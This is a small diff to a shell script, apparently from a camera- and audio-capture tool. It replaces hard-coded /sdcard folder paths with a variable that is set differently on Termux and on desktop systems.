@@ -208,24 +208,25 @@ exit
 fi
 
 #file_check Camera
+#check for i in instead of if else
 
 file_check() {
-if [ -d "/sdcard/Camera_hack" ]
+if [ -d "${files}/Camera_hack" ]
 then
 echo
 else 
-mkdir -p /sdcard/Camera_hack
+mkdir -p ${files}/Camera_hack
 fi
 }
 
 #file_check1 Audio 
 
 file_check1() {
-if [ -d "/sdcard/Audio_hack" ]
+if [ -d "${files}/Audio_hack" ]
 then
 echo
 else 
-mkdir -p /sdcard/Audio_hack
+mkdir -p ${files}/Audio_hack
 fi
 }
 
@@ -365,8 +366,10 @@ ash() {
 function os () {
 if [ -e $BIN/termux-info ]; then
 		BINDIR="${PREFIX}/bin/phs"
+		files="/sdcard"
 	else
 	        BINDIR="/usr/bin/phs"
+		files="$HOME/Desktop"
 fi
 }
 
